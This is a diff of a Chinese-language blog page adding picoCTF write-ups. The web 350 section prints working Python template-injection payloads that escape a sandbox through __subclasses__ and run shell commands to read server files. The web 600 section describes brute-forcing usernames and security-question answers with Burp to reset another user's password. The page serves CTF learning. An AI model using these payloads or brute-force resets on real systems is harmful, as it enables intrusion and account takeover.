@@ -102,7 +102,10 @@
 <meta property="og:description" content="有空就做点">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqliteeeeeeeeee.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/googlebot.PNG">
-<meta property="og:updated_time" content="2018-10-02T10:34:46.388Z">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/66666666python3.5.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/baopopasswordaaaaa.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/passwordreset666.PNG">
+<meta property="og:updated_time" content="2018-10-13T03:20:40.881Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="picoctfwp">
 <meta name="twitter:description" content="有空就做点">
@@ -365,6 +368,70 @@
 <p>里面提到了一个firefox的ua 插件</p>
 <p>安了下自带一个 googlebot的ua 一用 ojbk</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/googlebot.PNG" alt=""></p>
+<p>抓了下包发现是这样的</p>
+<p>User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +<a href="http://www.google.com/bot.html" target="_blank" rel="external">http://www.google.com/bot.html</a>)</p>
+<p>后来群里见了道题 让xxx浏览器访问 要想到改ua</p>
+<h3 id="web-350"><a href="#web-350" class="headerlink" title="web 350"></a>web 350</h3><p>python沙盒</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[].__class__.__base__.__subclasses__()</div></pre></td></tr></table></figure>
+<p>看一波</p>
+<p>好像 <class xxx=""> 是 python3 <type xxx=""> 是python2</type></class></p>
+<p>疯狂找之前的笔记 发现和 nox上沙盒第二题很像 </p>
+<p>搜了下有 os._wrap_close  高兴</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[673].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>))&#125;&#125;</div></pre></td></tr></table></figure>
+<p>结果 gg</p>
+<p>再用 <class 'codecs.streamreaderwriter'=""></class></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[1].__subclasses__()[320].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>]&#125;&#125;</div><div class="line">&lt;module <span class="string">'os'</span> from <span class="string">'/usr/lib/python3.5/os.py'</span>&gt;</div></pre></td></tr></table></figure>
+<p>发现 os 给我激动的 以为稳了 结果 system执行不了。。。</p>
+<p>listdir是可以的 </p>
+<p>得到 [‘app’, ‘xinet_startup.sh’, ‘server.py’]</p>
+<p>卡住了 。。想用open但好像被过滤了 </p>
+<p>肝了两天 终于做出来了。。。。。</p>
+<p>system是可以执行的 只不过它直返回 0 1  256 。。 我以为不行</p>
+<p>查到了这篇文章 </p>
+<p><a href="http://blog.sina.com.cn/s/blog_5357c0af0100z4rn.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_5357c0af0100z4rn.html</a></p>
+<p>里面写到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">os.system(<span class="string">'cat /proc/cpuinfo'</span>)</div><div class="line"></div><div class="line"></div><div class="line">但是这样是无法获得到输出和返回值的，继续 Google，之后学会了 os.popen()。</div><div class="line"></div><div class="line">output = os.popen(<span class="string">'cat /proc/cpuinfo'</span>)</div><div class="line"><span class="built_in">print</span> output.read()</div></pre></td></tr></table></figure>
+<p>于是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[1].__subclasses__()[441].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].popen(<span class="string">'ls app'</span>).read()&#125;&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[1].__subclasses__()[441].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].popen(<span class="string">'cat server.py'</span>).read()&#125;&#125;</div></pre></td></tr></table></figure>
+<p>（序号问题是它会定期清除数据库 每次生成的顺序有不同 但用的还是<class 'codecs.streamreaderwriter'=""><br>）</class></p>
+<p>woc成功了 ！！！！！</p>
+<p>分别返回了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__init__.py config.py helpers.py models.py routes.py templates</div></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">from app import app <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: app.run()</div></pre></td></tr></table></figure>
+<p>这一看读啊 flag肯定在app目录下的文件里面里面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[1].__subclasses__()[441].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].popen(<span class="string">'cat app/config.py'</span>).read()&#125;&#125;</div></pre></td></tr></table></figure>
+<p>结果tm不行 没返回 试了试读/app 也不行 应该是 / 被ban了 ??? 下手太狠了吧</p>
+<p>距离flag之差一步之遥</p>
+<p>试了试 less more等类似cat的命令 也都不行<br><a href="https://blog.csdn.net/guwuchangtian/article/details/76064057" target="_blank" rel="external">https://blog.csdn.net/guwuchangtian/article/details/76064057</a></p>
+<p>又卡了好久 终于搜到了这个<br><a href="https://blog.csdn.net/yimingsilence/article/details/76071949" target="_blank" rel="external">https://blog.csdn.net/yimingsilence/article/details/76071949</a></p>
+<p>发现牛逼的find命令可以查找目录下的所有文件中是否含有某个字符串</p>
+<p>这正是我需要的！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[1].__subclasses__()[441].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].popen(<span class="string">"find app|xargs grep -ri 'pico*'"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/66666666python3.5.PNG" alt=""></p>
+<p>终于hhhhh 独立搞定了道python沙盒题 开森！</p>
+<p>后来测了下 用os._wrap_close 应该也行 当时可能操作有问题</p>
+<h3 id="web-600"><a href="#web-600" class="headerlink" title="web 600"></a>web 600</h3><p>页面上大概意思是要重置密码</p>
+<p>要填一个用户名 试了些常见的admin test之类 都不行</p>
+<p>思考了一阵 awvs扫了下没看出明显的漏洞考点。。 转念一想 这尼玛不是爆破吧</p>
+<p>burp跑了个用户名字典 woc真跑出来了 跑出来10个左右(后来发现首页源码里每次会刷新一个用户名)</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/baopopasswordaaaaa.PNG" alt=""></p>
+<p>输用户名 会进入重置密码页面 问你密保问题</p>
+<p>刷了下 一共四个问题 你最喜欢的 color/hero/crackme/food</p>
+<p>又跑了下试试 还好以前存了什么 3,4，5…个字母的单词字典</p>
+<p>最先跑出了color是 green 我想 能不能全跑颜色问题 py造了个100000个green字典 </p>
+<p>结果burp不能连续跑 就是在 intruder 里 再点 intruder 跑的还是上次的</p>
+<p>那就只能跑一个 浏览器输入再抓包下一个问题跑 。。 但这样问题就随机了 我们不可控。。。</p>
+<p>所以我想全跑出来。。(好像隔一阵会变化 下午跑的 green 晚上好像就不行了)</p>
+<p>后来又跑出了 food是duck crackme是 kia 然后刷了个 hero问题。。</p>
+<p>结果跑了好久 跑到7字母单词了 还不行</p>
+<p>我就重新开了个页面试试 结果运气来了!</p>
+<p>问我 food food crackme 然后。。过了! 合着一共就随意抽三个问题 还可能重复</p>
+<p>然后成功重置了 mac用户的密码 登陆拿到flag </p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/passwordreset666.PNG" alt=""></p>
+<h3 id="misc-250"><a href="#misc-250" class="headerlink" title="misc 250"></a>misc 250</h3><p>If you visited a website at an IP address, how does it know the name of the domain?</p>
+<p>给了个流量包 看题目我以为是反查流量包ip 找域名</p>
+<p>结果搜了一遍没东西。。 无意中点了个dns包 看到了flag…</p>
+<p>才明白过来 英文理解错了 它问的是 ‘它’ 咋由ip知道域名的 是 dns 作用</p>
+<p>所以这题其实直接过滤 dns就行</p>
 
       
     </div>
@@ -559,7 +626,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-650"><span class="nav-number">1.</span> <span class="nav-text">web 650</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-200"><span class="nav-number">2.</span> <span class="nav-text">web 200</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-650"><span class="nav-number">1.</span> <span class="nav-text">web 650</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-200"><span class="nav-number">2.</span> <span class="nav-text">web 200</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-350"><span class="nav-number">3.</span> <span class="nav-text">web 350</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-600"><span class="nav-number">4.</span> <span class="nav-text">web 600</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-250"><span class="nav-number">5.</span> <span class="nav-text">misc 250</span></a></li></ol></div>
             
 
           </div>
